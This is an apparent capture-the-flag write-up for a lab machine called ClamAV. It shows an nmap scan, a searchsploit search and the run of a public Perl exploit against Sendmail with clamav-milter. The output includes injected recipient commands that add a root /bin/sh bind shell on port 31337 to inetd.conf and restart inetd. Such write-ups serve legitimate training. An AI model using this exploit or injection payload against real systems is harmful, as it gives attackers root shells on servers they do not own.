# ClamAV

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.175.42
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 21:01 +08
Warning: 192.168.175.42 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.175.42
Host is up (0.17s latency).
Not shown: 65448 closed tcp ports (conn-refused), 80 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown
```

### ClamAV Root

This machine was obviously hinting towards abusing ClamAV, the Antivirus. The SMTP port was open, and we can search for exploits using `searchsploit`:

```
$ searchsploit clamav    
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Hea | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Derefer | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow           | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution            | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (P | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service   | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Meta | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Exec | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Exec | multiple/remote/4761.pl
----------------------------------------------------------- ---------------------------------
```

The last exploit looked interesting because it had 'Sendmail' in it. We can try it out:

```
$ perl 4761.pl 192.168.175.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.175.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sat, 1 Jul 2023 13:02:43 -0400; (No UCE/UBE) logging access from: [192.168.45.164](FAIL)-[192.168.45.164]
250-localhost.localdomain Hello [192.168.45.164], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 361H2hEV004002 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

This exploit would spawn a `root` shell on port 31337 which we can connect to:

<figure><img src="../../../.gitbook/assets/image (3114).png" alt=""><figcaption></figcaption></figure>

Rooted!
